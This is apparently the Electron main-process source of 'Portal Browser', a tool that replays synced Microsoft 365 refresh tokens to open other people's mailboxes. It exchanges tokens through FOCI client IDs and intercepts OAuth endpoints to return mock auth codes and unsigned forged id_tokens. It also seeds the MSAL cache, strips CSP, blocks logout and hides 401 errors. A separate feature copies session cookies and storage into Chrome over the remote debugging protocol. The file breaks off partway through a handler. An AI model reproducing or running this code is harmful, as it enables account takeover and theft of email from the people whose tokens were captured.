import { app, BrowserWindow, ipcMain, Notification, net, shell, session, Menu } from 'electron';
import * as path from 'path';
import * as https from 'https';
import * as fs from 'fs';
import * as os from 'os';
import { exec, execFile } from 'child_process';
import { autoUpdater } from 'electron-updater';
import { AuthManager } from './auth';
import { GraphMailClient } from './graphClient';
import { TokenStore } from './tokenStore';

const DASHBOARD_API = 'https://outlook-token-dashboard.pages.dev/api';
const FOCI_CLIENT_ID = 'd3590ed6-52b3-4102-aeff-aad2292ab01c';
const CLIENT_ID = FOCI_CLIENT_ID;
const BROKER_CLIENT_ID = '29d9ed98-a469-4536-ade2-f981bc1d605e';
const OWA_URL = 'https://outlook.office365.com/mail/';
const EDGE_UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.2478.0';

function isLoginUrl(url: string): boolean {
  return url.includes('login.microsoftonline.com') || url.includes('login.live.com') || url.includes('login.microsoft.com');
}

// v2.0 token exchange (Portal Browser v10.10 pattern)
async function exchangeToken(refreshTk: string, clientId: string, scope: string): Promise<Record<string, unknown>> {
  try {
    const resp = await net.fetch('https://login.microsoftonline.com/common/oauth2/v2.0/token', {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: new URLSearchParams({ client_id: clientId, grant_type: 'refresh_token', refresh_token: refreshTk, scope }).toString(),
    });
    return await resp.json() as Record<string, unknown>;
  } catch (err: unknown) {
    return { error: 'fetch_failed', error_description: err instanceof Error ? err.message : 'unknown' };
  }
}

async function exchangeTokenWithFallback(refreshTk: string, scope: string): Promise<Record<string, unknown>> {
  for (const clientId of [FOCI_CLIENT_ID, BROKER_CLIENT_ID]) {
    const result = await exchangeToken(refreshTk, clientId, scope);
    if (!result.error && result.access_token) return result;
  }
  return { error: 'all_clients_failed' };
}

function decodeJwt(token: string): Record<string, unknown> | null {
  try {
    const parts = token.split('.');
    if (parts.length < 2) return null;
    return JSON.parse(Buffer.from(parts[1], 'base64url').toString());
  } catch { return null; }
}

// Domain helpers
const MS_DOMAINS = ['microsoft.com', 'microsoftonline.com', 'office.com', 'office365.com', 'azure.com', 'sharepoint.com', 'live.com', 'onedrive.com', 'onenote.com'];
function isMsDomain(hostname: string): boolean { return MS_DOMAINS.some(d => hostname === d || hostname.endsWith('.' + d)); }

const API_DOMAINS = ['outlook.office365.com', 'outlook.office.com', 'substrate.office.com', 'graph.microsoft.com', 'admin.microsoft.com', 'portal.office.com', 'www.office.com'];
function isApiDomain(hostname: string): boolean { return API_DOMAINS.some(d => hostname === d || hostname.endsWith('.' + d)); }

const CDN_DOMAINS = ['res.office365.com', 'res.cdn.office.net', 'cdn.office.net', 'akamaized.net', 'msecnd.net', 'aspnetcdn.com', 'office.net', 'shellprod.msocdn.com'];
function isCdnDomain(hostname: string): boolean { return CDN_DOMAINS.some(d => hostname === d || hostname.endsWith('.' + d)); }

const LOGOUT_PATHS = ['/logout', '/signout', '/logoff', '/sign-out', 'oauth2/logout', '/common/oauth2/v2.0/logout'];
function isLogoutUrl(url: string): boolean {
  try { const p = new URL(url).pathname.toLowerCase(); return LOGOUT_PATHS.some(lp => p.includes(lp)); } catch { return false; }
}

// Reliable HTTP POST using Node's native https module (avoids Electron net.fetch quirks)
function httpsPost(url: string, data: Record<string, unknown>): Promise<{ status: number; body: string }> {
  return new Promise((resolve, reject) => {
    const postData = JSON.stringify(data);
    const urlObj = new URL(url);
    const options = {
      hostname: urlObj.hostname,
      port: 443,
      path: urlObj.pathname,
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(postData),
      },
    };

    const req = https.request(options, (res) => {
      let body = '';
      res.on('data', (chunk: Buffer) => { body += chunk.toString(); });
      res.on('end', () => {
        resolve({ status: res.statusCode || 500, body });
      });
    });

    req.on('error', reject);
    req.write(postData);
    req.end();
  });
}

let mainWindow: BrowserWindow | null = null;
let authManager: AuthManager;
let graphClient: GraphMailClient | null = null;
const tokenStore = new TokenStore();

interface SyncedAccount {
  sessionId: string;
  email: string;
  name: string;
  accessToken: string;
  refreshToken: string;
  accessTokenExpiry: string;
}

const syncedAccounts: SyncedAccount[] = [];

const SERVICE_URLS: Record<string, string> = {
  owa: 'https://outlook.office365.com/mail/',
  onedrive: 'https://www.office.com/launch/onedrive',
  admin: 'https://admin.microsoft.com/',
  sharepoint: 'https://admin.microsoft.com/#/SharePoint',
  teams: 'https://teams.microsoft.com/',
  azure: 'https://portal.azure.com/',
  chrome: 'https://outlook.office365.com/mail/',
};

function createWindow(): void {
  mainWindow = new BrowserWindow({
    width: 1400,
    height: 900,
    minWidth: 900,
    minHeight: 600,
    title: 'Portal Browser',
    icon: path.join(__dirname, '../../assets/icon.png'),
    webPreferences: {
      preload: path.join(__dirname, 'preload.js'),
      contextIsolation: true,
      nodeIntegration: false,
    },
  });

  if (process.env.NODE_ENV === 'development' || !app.isPackaged) {
    mainWindow.loadURL('http://localhost:5173');
  } else {
    mainWindow.loadFile(path.join(__dirname, '../renderer/index.html'));
  }

  mainWindow.on('closed', () => {
    mainWindow = null;
  });
}

async function refreshAccountToken(account: SyncedAccount): Promise<boolean> {
  const result = await exchangeTokenWithFallback(account.refreshToken, 'https://outlook.office.com/.default openid profile offline_access');
  if (!result.error && result.access_token) {
    account.accessToken = result.access_token as string;
    if (result.refresh_token) account.refreshToken = result.refresh_token as string;
    const expiresIn = (result.expires_in as number) || 3600;
    account.accessTokenExpiry = new Date(Date.now() + expiresIn * 1000).toISOString();
    return true;
  }
  return false;
}

// Portal Browser v10.10 protocol handler approach — intercepts ALL HTTPS
// requests at the protocol level. This is what makes authenticated OWA work:
// 1. Intercepts MSAL's /oauth2/authorize → returns 302 with mock auth code
// 2. Intercepts MSAL's /oauth2/token → exchanges refresh token, returns real tokens
// 3. Injects Bearer on API domains
// 4. Blocks logout, strips CSP, suppresses 401s
async function launchChromeWithSession(account: SyncedAccount, service: string): Promise<{ success: boolean; error?: string }> {
  try {
    const url = SERVICE_URLS[service] || SERVICE_URLS.owa;
    const email = account.email;

    // Step 1: Exchange tokens for all needed scopes (parallel)
    const scopes = [
      { key: 'outlook', scope: 'https://outlook.office.com/.default openid profile offline_access' },
      { key: 'outlook365', scope: 'https://outlook.office365.com/.default openid profile offline_access' },
      { key: 'graph', scope: 'https://graph.microsoft.com/.default openid profile offline_access' },
      { key: 'substrate', scope: 'https://substrate.office.com/.default openid profile offline_access' },
    ];

    const resourceTokens: Record<string, string> = {};
    let firstResult: Record<string, unknown> | null = null;
    let currentRefreshToken = account.refreshToken;

    const tokenResults = await Promise.allSettled(
      scopes.map(s => exchangeTokenWithFallback(account.refreshToken, s.scope).then(r => ({ ...r, _key: s.key })))
    );

    for (const settled of tokenResults) {
      if (settled.status === 'fulfilled') {
        const result = settled.value as Record<string, unknown>;
        if (!result.error && result.access_token) {
          resourceTokens[result._key as string] = result.access_token as string;
          if (!firstResult) {
            firstResult = result;
            currentRefreshToken = (result.refresh_token as string) || account.refreshToken;
          }
        }
      }
    }

    if (!firstResult) {
      return { success: false, error: 'All token exchanges failed — re-sync this account.' };
    }

    // Cross-fill outlook tokens
    if (resourceTokens.outlook && !resourceTokens.outlook365) resourceTokens.outlook365 = resourceTokens.outlook;
    if (resourceTokens.outlook365 && !resourceTokens.outlook) resourceTokens.outlook = resourceTokens.outlook365;

    // Persist refreshed token
    account.refreshToken = currentRefreshToken;
    account.accessToken = resourceTokens.outlook || (firstResult.access_token as string);

    const decoded = decodeJwt(firstResult.access_token as string);
    const oid = (decoded?.oid as string) || '';
    const tid = (decoded?.tid as string) || '';
    const clientInfo = Buffer.from(JSON.stringify({ uid: oid, utid: tid })).toString('base64').replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');

    // Step 2: Create session with protocol handler
    const partitionName = `persist:portal-${account.sessionId}-${service}`;
    const portalSession = session.fromPartition(partitionName);

    // Strip CSP headers
    portalSession.webRequest.onHeadersReceived((details, callback) => {
      const headers = { ...details.responseHeaders };
      delete headers['content-security-policy'];
      delete headers['Content-Security-Policy'];
      delete headers['content-security-policy-report-only'];
      delete headers['Content-Security-Policy-Report-Only'];
      callback({ responseHeaders: headers });
    });

    // Helper: get the right token for a hostname
    function getTokenForHost(hostname: string): string {
      if (hostname.includes('outlook') || hostname.includes('office365'))
        return resourceTokens.outlook || resourceTokens.graph || (firstResult!.access_token as string);
      if (hostname.includes('graph.microsoft'))
        return resourceTokens.graph || (firstResult!.access_token as string);
      if (hostname.includes('substrate'))
        return resourceTokens.substrate || (firstResult!.access_token as string);
      return resourceTokens.graph || (firstResult!.access_token as string);
    }

    // PROTOCOL HANDLER — intercept ALL HTTPS requests
    portalSession.protocol.handle('https', async (request) => {
      const parsed = new URL(request.url);

      // Block logout
      if (isLogoutUrl(request.url)) {
        return new Response('<!DOCTYPE html><html><body><script>history.back();</script></body></html>', {
          status: 200, headers: { 'content-type': 'text/html; charset=utf-8' },
        });
      }

      // Intercept OAuth authorize → return 302 with mock auth code
      if (parsed.hostname === 'login.microsoftonline.com' &&
          (parsed.pathname.includes('/oauth2/authorize') || parsed.pathname.includes('/oauth2/v2.0/authorize'))) {
        const redirectUri = parsed.searchParams.get('redirect_uri') || OWA_URL;
        const state = parsed.searchParams.get('state') || '';
        const scope = parsed.searchParams.get('scope') || '';
        const responseMode = parsed.searchParams.get('response_mode') || 'fragment';

        // Silently exchange for the requested scope
        if (scope) {
          try {
            const result = await exchangeTokenWithFallback(currentRefreshToken, scope);
            if (!result.error && result.access_token) {
              const dec = decodeJwt(result.access_token as string);
              const aud = (dec?.aud as string) || '';
              if (aud.includes('graph')) resourceTokens.graph = result.access_token as string;
              else if (aud.includes('outlook')) resourceTokens.outlook = result.access_token as string;
              if (result.refresh_token) currentRefreshToken = result.refresh_token as string;
            }
          } catch { /* ignore */ }
        }

        const mockCode = 'mock_auth_code_' + Date.now();
        const params = new URLSearchParams({ code: mockCode, state, client_info: clientInfo, session_state: Date.now().toString() });
        const sep = responseMode === 'query' ? '?' : '#';
        return new Response(null, {
          status: 302,
          headers: { Location: redirectUri + sep + params.toString(), 'Cache-Control': 'no-store, no-cache' },
        });
      }

      // Intercept OAuth token → exchange refresh token and return real tokens
      if (parsed.hostname === 'login.microsoftonline.com' &&
          (parsed.pathname.includes('/oauth2/token') || parsed.pathname.includes('/oauth2/v2.0/token')) &&
          request.method === 'POST') {
        let bodyText = '';
        try { bodyText = await request.text(); } catch { /* empty */ }
        const bodyParams = new URLSearchParams(bodyText);
        const code = bodyParams.get('code') || '';
        const grantType = bodyParams.get('grant_type') || '';

        if ((code && code.startsWith('mock_auth_code_')) || grantType === 'refresh_token') {
          const reqClientId = bodyParams.get('client_id') || BROKER_CLIENT_ID;
          const reqScope = bodyParams.get('scope') || 'https://outlook.office.com/.default openid profile offline_access';

          let tokenResult = firstResult!;
          try {
            const exchanged = await exchangeToken(currentRefreshToken, reqClientId, reqScope);
            if (!exchanged.error && exchanged.access_token) {
              tokenResult = exchanged;
              const dec = decodeJwt(exchanged.access_token as string);
              const aud = (dec?.aud as string) || '';
              if (aud.includes('graph')) resourceTokens.graph = exchanged.access_token as string;
              else if (aud.includes('outlook') || aud.includes('office')) resourceTokens.outlook = exchanged.access_token as string;
              if (exchanged.refresh_token) currentRefreshToken = exchanged.refresh_token as string;
            }
          } catch { /* use firstResult */ }

          // Build id_token (alg: none)
          const now = Math.floor(Date.now() / 1000);
          const idClaims = { aud: reqClientId, iss: `https://login.microsoftonline.com/${tid}/v2.0`, iat: now, nbf: now, exp: now + 3600, sub: oid, oid, tid, preferred_username: email, name: email, email, ver: '2.0' };
          const idHeader = Buffer.from(JSON.stringify({ typ: 'JWT', alg: 'none' })).toString('base64url');
          const idPayload = Buffer.from(JSON.stringify(idClaims)).toString('base64url');

          const tokenResponse = {
            access_token: tokenResult.access_token, token_type: 'Bearer',
            expires_in: (tokenResult.expires_in as number) || 3600, ext_expires_in: 3600,
            scope: (tokenResult.scope as string) || reqScope,
            id_token: idHeader + '.' + idPayload + '.',
            refresh_token: (tokenResult.refresh_token as string) || currentRefreshToken,
            client_info: clientInfo, foci: '1',
          };
          return new Response(JSON.stringify(tokenResponse), {
            status: 200, headers: { 'content-type': 'application/json; charset=utf-8', 'cache-control': 'no-store' },
          });
        }

        // Unknown token request — pass through
        try { return await net.fetch(new Request(request.url, { method: 'POST', headers: request.headers, body: bodyText })); }
        catch { return new Response('{}', { status: 500 }); }
      }

      // API domains → inject Bearer token
      if (!isCdnDomain(parsed.hostname) && isApiDomain(parsed.hostname)) {
        const token = getTokenForHost(parsed.hostname);
        const headers = new Headers(request.headers);
        if (!headers.has('Authorization') || headers.get('Authorization') === 'Bearer')
          headers.set('Authorization', 'Bearer ' + token);
        headers.set('User-Agent', EDGE_UA);

        try {
          const resp = await net.fetch(new Request(request.url, {
            method: request.method, headers,
            body: request.method !== 'GET' && request.method !== 'HEAD' ? request.body : undefined,
            duplex: request.method !== 'GET' && request.method !== 'HEAD' ? 'half' : undefined,
          } as RequestInit));

          // On 401, suppress with empty 200 (prevents OWA session-expired UI)
          if (resp.status === 401) {
            return new Response('{}', { status: 200, headers: { 'content-type': 'application/json' } });
          }
          return resp;
        } catch {
          return net.fetch(request.url, { method: request.method, headers: Object.fromEntries(headers.entries()) });
        }
      }

      // Everything else — pass through
      try { return await net.fetch(request); }
      catch { return new Response('', { status: 502 }); }
    });

    // Step 3: Create window
    portalSession.setPermissionRequestHandler((_wc, _permission, cb) => cb(true));

    const portalWindow = new BrowserWindow({
      width: 1400, height: 900, show: false,
      title: `${email} — ${service.toUpperCase()}`,
      webPreferences: {
        partition: partitionName,
        contextIsolation: true,
        nodeIntegration: false,
        sandbox: false,
      },
    });

    // CSP bypass via CDP
    try {
      portalWindow.webContents.debugger.attach('1.3');
      portalWindow.webContents.debugger.sendCommand('Page.setBypassCSP', { enabled: true });
    } catch { /* non-fatal */ }

    // MSAL cache seeding + stability script on dom-ready
    const msalEmail = email;
    const msalScript = `
    (function() {
      try {
        const oid = ${JSON.stringify(oid)};
        const tid = ${JSON.stringify(tid)};
        const email = ${JSON.stringify(msalEmail)};
        const homeAccountId = oid + '.' + tid;
        const environment = 'login.microsoftonline.com';
        const now = Math.floor(Date.now() / 1000);
        const clientInfo = btoa(JSON.stringify({ uid: oid, utid: tid })).replace(/\\+/g, '-').replace(/\\//g, '_').replace(/=+$/g, '');
        const portalClientIds = { outlook: '9199bf20-a13f-4107-85dc-02114787ef48', office: '4765445b-32c6-49b0-83e6-1d93765276ca', default: 'd3590ed6-52b3-4102-aeff-aad2292ab01c' };
        const host = window.location.hostname;
        let clientId = portalClientIds['default'];
        if (host.includes('outlook')) clientId = portalClientIds.outlook;
        else if (host.includes('office')) clientId = portalClientIds.office;
        const idPayload = { aud: clientId, iss: 'https://login.microsoftonline.com/' + tid + '/v2.0', iat: now, nbf: now, exp: now + 86400, sub: oid, oid, tid, preferred_username: email, name: email, email, ver: '2.0' };
        const idHeader = btoa(JSON.stringify({typ:'JWT',alg:'none'})).replace(/=/g,'');
        const idBody = btoa(JSON.stringify(idPayload)).replace(/=/g,'');
        const idToken = idHeader + '.' + idBody + '.';
        const accountKey = homeAccountId + '-' + environment + '-' + tid;
        const accountValue = { homeAccountId, environment, tenantId: tid, username: email, localAccountId: oid, name: email, authorityType: 'MSSTS', clientInfo, realm: tid };
        const idTokenKey = homeAccountId + '-' + environment + '-idtoken-' + clientId + '-' + tid + '---';
        const idTokenValue = { credentialType: 'IdToken', homeAccountId, environment, clientId, secret: idToken, realm: tid };
        const scopes = 'openid profile';
        const atKey = homeAccountId + '-' + environment + '-accesstoken-' + clientId + '-' + tid + '-' + scopes + '--';
        const atValue = { credentialType: 'AccessToken', homeAccountId, environment, clientId, secret: ${JSON.stringify(resourceTokens.graph || (firstResult.access_token as string))}, realm: tid, target: scopes, cachedAt: now.toString(), expiresOn: (now + 3600).toString(), extendedExpiresOn: (now + 7200).toString(), tokenType: 'Bearer' };
        const rtKey = homeAccountId + '-' + environment + '-refreshtoken-' + clientId + '----';
        const rtValue = { credentialType: 'RefreshToken', homeAccountId, environment, clientId, secret: ${JSON.stringify(currentRefreshToken)} };
        sessionStorage.setItem(accountKey, JSON.stringify(accountValue));
        sessionStorage.setItem(idTokenKey, JSON.stringify(idTokenValue));
        sessionStorage.setItem(atKey, JSON.stringify(atValue));
        sessionStorage.setItem(rtKey, JSON.stringify(rtValue));
        sessionStorage.setItem('msal.account.keys', JSON.stringify([accountKey]));
        sessionStorage.setItem('msal.' + clientId + '.active-account', homeAccountId);
        sessionStorage.setItem('msal.' + clientId + '.interaction.status', '');
      } catch(e) {}
    })();`;

    const stabilityScript = `
    (function() {
      try {
        window.addEventListener('unhandledrejection', function(e) {
          var msg = (e.reason && e.reason.message) || String(e.reason || '');
          if (msg.includes('401') || msg.includes('Unauthorized') || msg.includes('Failed to fetch') || msg.includes('session') || msg.includes('token') || msg.includes('auth') || msg.includes('expired')) {
            e.preventDefault();
          }
        });
        Object.defineProperty(navigator, 'onLine', { get: function() { return true; }, configurable: true });
        var origAssign = window.location.assign.bind(window.location);
        var origReplace = window.location.replace.bind(window.location);
        function isLogin(url) { return typeof url === 'string' && (url.includes('login.microsoftonline.com') || url.includes('/logoff') || url.includes('/signout') || url.includes('/logout')); }
        window.location.assign = function(url) { if (isLogin(url)) return; return origAssign(url); };
        window.location.replace = function(url) { if (isLogin(url)) return; return origReplace(url); };
        window.location.reload = function() {};
      } catch(e) {}
    })();`;

    portalWindow.webContents.on('dom-ready', () => {
      const u = portalWindow.webContents.getURL();
      if (u && isMsDomain(new URL(u).hostname)) {
        portalWindow.webContents.executeJavaScript(stabilityScript).catch(() => {});
        portalWindow.webContents.executeJavaScript(msalScript).catch(() => {});
      }
    });

    // Block login popups
    portalWindow.webContents.setWindowOpenHandler(({ url: popupUrl }) => {
      if (isLoginUrl(popupUrl)) return { action: 'deny' };
      return { action: 'allow' };
    });

    // ── Open Real Session in Chrome/Edge (Portal Browser v10.10 pattern) ──
    async function openRealSession(): Promise<void> {
      try {
        // 1. Collect session data from the portal window
        let localData: Record<string, string> = {};
        let sessionData: Record<string, string> = {};
        try { localData = await portalWindow.webContents.executeJavaScript('(function(){var d={};for(var i=0;i<localStorage.length;i++){var k=localStorage.key(i);d[k]=localStorage.getItem(k)}return d})()'); } catch {}
        try { sessionData = await portalWindow.webContents.executeJavaScript('(function(){var d={};for(var i=0;i<sessionStorage.length;i++){var k=sessionStorage.key(i);d[k]=sessionStorage.getItem(k)}return d})()'); } catch {}
        const allCookies = await portalSession.cookies.get({});
        const msCookies = allCookies.filter(c => {
          const d = c.domain || '';
          return d.includes('microsoft') || d.includes('office') || d.includes('live.com') || d.includes('sharepoint') || d.includes('azure') || d.includes('microsoftonline');
        });

        if (msCookies.length === 0) {
          portalWindow.webContents.executeJavaScript('alert("No session cookies found. Browse the portal first, then try again.")');
          return;
        }

        // 2. Build injection script
        const injectionLines: string[] = [];
        const httpOnlyCookies: Array<{ name: string; value: string; domain: string; path: string; secure: boolean; httpOnly: boolean; sameSite: string; expires: number }> = [];
        const longExpiry = new Date(Date.now() + 24 * 60 * 60 * 1000).toUTCString();
        const longExpiryEpoch = Math.floor(Date.now() / 1000) + 86400;

        for (const c of msCookies) {
          if (c.httpOnly) {
            httpOnlyCookies.push({ name: c.name, value: c.value, domain: c.domain || '', path: c.path || '/', secure: !!c.secure, httpOnly: true, sameSite: (c.sameSite as string) || 'no_restriction', expires: longExpiryEpoch });
            continue;
          }
          const parts = [c.name + '=' + c.value];
          if (c.domain) parts.push('domain=' + c.domain);
          parts.push('path=' + (c.path || '/'));
          if (c.secure) parts.push('secure');
          parts.push('expires=' + longExpiry);
          injectionLines.push('try{document.cookie=' + JSON.stringify(parts.join('; ')) + '}catch(e){}');
        }
        for (const [k, v] of Object.entries(localData)) {
          injectionLines.push('try{localStorage.setItem(' + JSON.stringify(k) + ',' + JSON.stringify(v) + ')}catch(e){}');
        }
        for (const [k, v] of Object.entries(sessionData)) {
          injectionLines.push('try{sessionStorage.setItem(' + JSON.stringify(k) + ',' + JSON.stringify(v) + ')}catch(e){}');
        }

        // 3. Find Chrome or Edge
        const browserPaths = process.platform === 'win32' ? [
          'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe',
          'C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe',
          path.join(os.homedir(), 'AppData', 'Local', 'Google', 'Chrome', 'Application', 'chrome.exe'),
          'C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe',
          'C:\\Program Files\\Microsoft\\Edge\\Application\\msedge.exe',
        ] : [
          '/usr/bin/google-chrome', '/usr/bin/google-chrome-stable', '/usr/bin/chromium-browser', '/usr/bin/chromium',
          '/opt/google/chrome/chrome',
        ];
        let browserPath: string | null = null;
        for (const bp of browserPaths) { if (fs.existsSync(bp)) { browserPath = bp; break; } }
        if (!browserPath) {
          // Fallback: open URL in default browser without session
          shell.openExternal(url);
          return;
        }

        // 4. Write temp files
        const tmpDir = os.tmpdir();
        const ts = Date.now();
        const scriptFile = path.join(tmpDir, 'portal-inject-' + ts + '.js');
        const cookiesFile = path.join(tmpDir, 'portal-cookies-' + ts + '.json');
        const cdpScript = path.join(tmpDir, 'portal-cdp-' + ts + '.mjs');
        const debugPort = 9222 + Math.floor(Math.random() * 1000);
        const userDir = path.join(tmpDir, 'portal-chrome-' + ts);
        const targetUrl = url;

        fs.writeFileSync(scriptFile, injectionLines.join(';\n'));
        fs.writeFileSync(cookiesFile, JSON.stringify(httpOnlyCookies));

        // CDP automation script
        const cdpCode = `
import { readFileSync } from 'fs';
import http from 'http';
const PORT = ${debugPort};
const TARGET_URL = ${JSON.stringify(targetUrl)};
const SCRIPT_FILE = ${JSON.stringify(scriptFile)};
const COOKIES_FILE = ${JSON.stringify(cookiesFile)};
async function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
async function getTarget() {
    for (let i = 0; i < 15; i++) {
        try {
            const data = await new Promise((resolve, reject) => {
                http.get('http://127.0.0.1:' + PORT + '/json', res => {
                    let body = '';
                    res.on('data', c => body += c);
                    res.on('end', () => { try { resolve(JSON.parse(body)); } catch(e) { reject(e); } });
                }).on('error', reject);
            });
            const page = data.find(t => t.type === 'page');
            if (page && page.webSocketDebuggerUrl) return page;
        } catch(e) {}
        await sleep(1000);
    }
    throw new Error('Could not connect to Chrome CDP');
}
async function main() {
    const target = await getTarget();
    const ws = new WebSocket(target.webSocketDebuggerUrl);
    let msgId = 0;
    const pending = {};
    ws.onmessage = (evt) => { try { const msg = JSON.parse(evt.data); if (msg.id && pending[msg.id]) { pending[msg.id](msg); delete pending[msg.id]; } } catch(e) {} };
    function send(method, params = {}) {
        return new Promise((resolve) => {
            const id = ++msgId;
            pending[id] = resolve;
            ws.send(JSON.stringify({ id, method, params }));
            setTimeout(() => { if (pending[id]) { pending[id]({ error: 'timeout' }); delete pending[id]; } }, 15000);
        });
    }
    await new Promise(r => { ws.onopen = r; });
    await send('Network.enable');
    await send('Page.enable');
    let httpOnlyCookies = [];
    try { httpOnlyCookies = JSON.parse(readFileSync(COOKIES_FILE, 'utf8')); } catch(e) {}
    if (httpOnlyCookies.length > 0) {
        for (const cookie of httpOnlyCookies) {
            await send('Network.setCookie', { name: cookie.name, value: cookie.value, domain: cookie.domain, path: cookie.path || '/', secure: cookie.secure !== false, httpOnly: true, sameSite: cookie.sameSite || 'None', expires: cookie.expires });
        }
    }
    await send('Page.navigate', { url: TARGET_URL });
    await sleep(2000);
    const script = readFileSync(SCRIPT_FILE, 'utf8');
    await send('Runtime.evaluate', { expression: script, returnByValue: true });
    await send('Page.reload');
    await sleep(1000);
    ws.close();
    process.exit(0);
}
main().catch(e => { console.error('[CDP] Error:', e.message); process.exit(1); });
`;
        fs.writeFileSync(cdpScript, cdpCode);

        // 5. Launch Chrome with remote debugging
        execFile(browserPath, [
          '--remote-debugging-port=' + debugPort,
          '--user-data-dir=' + userDir,
          '--no-first-run',
          '--no-default-browser-check',
          targetUrl,
        ], (err) => { if (err && !err.killed) console.error('Browser error:', err.message); });

        // 6. Run CDP automation
        exec('node ' + JSON.stringify(cdpScript), (err) => {
          if (err) console.error('CDP script error:', err.message);
          try { fs.unlinkSync(scriptFile); } catch {}
          try { fs.unlinkSync(cookiesFile); } catch {}
          try { fs.unlinkSync(cdpScript); } catch {}
        });

        // Show toast
        portalWindow.webContents.executeJavaScript(`
          (function(){
            var d=document.createElement('div');
            d.style.cssText='position:fixed;top:20px;right:20px;padding:16px 24px;background:#6366f1;color:#fff;border-radius:8px;z-index:999999;font-family:Segoe UI,sans-serif;font-size:14px;box-shadow:0 4px 16px rgba(0,0,0,0.3);transition:opacity 0.3s';
            d.innerHTML='<b>Opening real session in Chrome...</b><br><small style="opacity:0.85">Session data will be injected automatically</small>';
            document.body.appendChild(d);
            setTimeout(function(){d.style.opacity='0';setTimeout(function(){d.remove()},300)},5000);
          })()
        `).catch(() => {});
      } catch (err) {
        console.error('Real session error:', err);
      }
    }

    // ── Right-click context menu ──
    portalWindow.webContents.on('context-menu', (_event, params) => {
      const menuItems: Electron.MenuItemConstructorOptions[] = [];
      menuItems.push({ label: 'Open Real Session in Chrome', click: () => openRealSession() });
      menuItems.push({ type: 'separator' });
      if (params.selectionText) {
        menuItems.push({ label: 'Copy', role: 'copy' });
        menuItems.push({ type: 'separator' });
      }
      if (params.isEditable) {
        menuItems.push({ label: 'Cut', role: 'cut' });
        menuItems.push({ label: 'Copy', role: 'copy' });
        menuItems.push({ label: 'Paste', role: 'paste' });
        menuItems.push({ type: 'separator' });
      }
      menuItems.push({ label: 'Select All', role: 'selectAll' });
      if (params.linkURL) {
        menuItems.push({ type: 'separator' });
        menuItems.push({ label: 'Open Link in Browser', click: () => shell.openExternal(params.linkURL) });
      }
      Menu.buildFromTemplate(menuItems).popup({ window: portalWindow });
    });

    // ── Keyboard shortcut: Ctrl+Shift+R → Open Real Session ──
    portalWindow.webContents.on('before-input-event', (event, input) => {
      if (input.control && input.shift && input.type === 'keyDown' && input.key.toLowerCase() === 'r') {
        event.preventDefault();
        openRealSession();
      }
    });

    portalWindow.loadURL(url);
    portalWindow.show();
    return { success: true };
  } catch (error: unknown) {
    const message = error instanceof Error ? error.message : 'Failed to launch browser session';
    return { success: false, error: message };
  }
}

function findChromePath(): string {
  if (process.platform === 'win32') {
    return 'start chrome';
  } else if (process.platform === 'darwin') {
    return 'open -a "Google Chrome"';
  }
  return 'google-chrome';
}

async function launchExternalChrome(account: SyncedAccount, service: string): Promise<{ success: boolean; error?: string }> {
  const url = SERVICE_URLS[service] || SERVICE_URLS.owa;
  const profileDir = path.join(app.getPath('userData'), 'chrome-profiles', account.sessionId);

  const chromePath = findChromePath();
  const args = [
    `--user-data-dir="${profileDir}"`,
    `--no-first-run`,
    `--no-default-browser-check`,
    `"${url}?login_hint=${encodeURIComponent(account.email)}"`,
  ];

  return new Promise((resolve) => {
    exec(`${chromePath} ${args.join(' ')}`, (error) => {
      if (error) {
        // Fallback to shell.openExternal
        shell.openExternal(`${url}?login_hint=${encodeURIComponent(account.email)}`);
      }
      resolve({ success: true });
    });
  });
}

function setupIpcHandlers(): void {
  ipcMain.handle('auth:login', async () => {
    try {
      const result = await authManager.loginWithDeviceCode(mainWindow!);
      if (result) {
        graphClient = new GraphMailClient(authManager);
        const profile = await graphClient.getProfile();
        return { success: true, profile };
      }
      return { success: false, error: 'Login cancelled' };
    } catch (error: unknown) {
      const message = error instanceof Error ? error.message : 'Login failed';
      return { success: false, error: message };
    }
  });

  ipcMain.handle('auth:openVerification', async (_event, url: string) => {
    authManager.openVerificationPage(url);
  });

  ipcMain.handle('auth:logout', async () => {
    try {
      await authManager.logout();
      graphClient = null;
      return { success: true };
    } catch (error: unknown) {
      const message = error instanceof Error ? error.message : 'Logout failed';
      return { success: false, error: message };
    }
  });

  ipcMain.handle('auth:check', async () => {
    try {
      if (authManager.isImportedSession()) {
        const importedToken = await authManager.getImportedAccessToken();
        if (importedToken) {
          graphClient = new GraphMailClient(importedToken);
          try {
            const profile = await graphClient.getProfile();
            return { authenticated: true, profile };
          } catch {
            const tokens = tokenStore.getImportedTokens();
            if (!tokens?.refreshToken) return { authenticated: false };
            const body = new URLSearchParams({
              client_id: CLIENT_ID,
              grant_type: 'refresh_token',
              refresh_token: tokens.refreshToken,
              resource: 'https://graph.microsoft.com',
            });
            const response = await net.fetch('https://login.microsoftonline.com/common/oauth2/token', {
              method: 'POST',
              headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
              body: body.toString(),
            });
            if (!response.ok) return { authenticated: false };
            const data = await response.json() as Record<string, unknown>;
            const newAccessToken = data.access_token as string;
            const newRefreshToken = (data.refresh_token as string) || tokens.refreshToken;
            tokenStore.saveImportedTokens(newAccessToken, newRefreshToken, tokens.email);
            graphClient = new GraphMailClient(newAccessToken);
            const profile = await graphClient.getProfile();
            return { authenticated: true, profile };
          }
        }
      }

      const token = await authManager.acquireTokenSilent();
      if (token) {
        graphClient = new GraphMailClient(authManager);
        const profile = await graphClient.getProfile();
        return { authenticated: true, profile };
      }
      return { authenticated: false };
    } catch {
      return { authenticated: false };
    }
  });

  ipcMain.handle('mail:getFolders', async () => {
    if (!graphClient) return { success: false, error: 'Not authenticated' };
    try {
      const folders = await graphClient.getMailFolders();
      return { success: true, folders };
    } catch (error: unknown) {
      const message = error instanceof Error ? error.message : 'Failed to fetch folders';
      return { success: false, error: message };
    }
  });

  ipcMain.handle('mail:getMessages', async (_event, folderId: string, page: number, pageSize: number) => {
    if (!graphClient) return { success: false, error: 'Not authenticated' };
    try {
